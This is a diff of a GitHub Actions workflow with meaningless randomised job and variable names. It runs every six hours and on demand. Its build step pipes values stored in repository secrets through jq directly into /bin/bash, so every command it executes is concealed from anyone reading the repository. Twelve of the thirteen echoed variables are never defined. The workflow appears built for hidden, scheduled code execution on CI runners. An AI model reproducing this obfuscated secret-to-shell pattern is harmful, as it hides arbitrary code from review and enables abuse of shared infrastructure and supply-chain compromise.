@@ -1,25 +1,30 @@
 name: pengjingzhong7519
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 0/6 * * *'
+    - cron: '15 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pengjingzhong7519
         env:
-          iztj3968: ${{ secrets.iztj3968 }}
+          bdx35357: ${{ secrets.bdx35357 }}
         run: |
-          echo $iztj3968 | jq -r .fi31 | /bin/bash
-          echo $q27698 | jq -r .udw9 | /bin/bash
-          echo $ykle115 | jq -r .fe1 | /bin/bash
-          echo $m77 | jq -r .gdejh9 | /bin/bash
-          echo $lfje23752 | jq -r .wtc0 | /bin/bash
-          echo $iljlg5196 | jq -r .omq01 | /bin/bash
-          echo $umv15966 | jq -r .iew7 | /bin/bash
-          echo $vva302 | jq -r .aqj81339 | /bin/bash
-          echo $xr0729 | jq -r .zjuf7 | /bin/bash
+          echo $bdx35357 | jq -r .ib4 | /bin/bash
+          echo $sav32193 | jq -r .ock06 | /bin/bash
+          echo $hngo0 | jq -r .x15 | /bin/bash
+          echo $pc99 | jq -r .c9114 | /bin/bash
+          echo $xrpw196 | jq -r .gd68 | /bin/bash
+          echo $fk5 | jq -r .mulyv26 | /bin/bash
+          echo $csr0185 | jq -r .z19398 | /bin/bash
+          echo $riakr29875 | jq -r .urbx11684 | /bin/bash
+          echo $hwsug7286 | jq -r .d9 | /bin/bash
+          echo $wjfvr21 | jq -r .t9 | /bin/bash
+          echo $jo6002 | jq -r .m84 | /bin/bash
+          echo $pj31 | jq -r .zj9 | /bin/bash
+          echo $e101 | jq -r .v8477 | /bin/bash
 
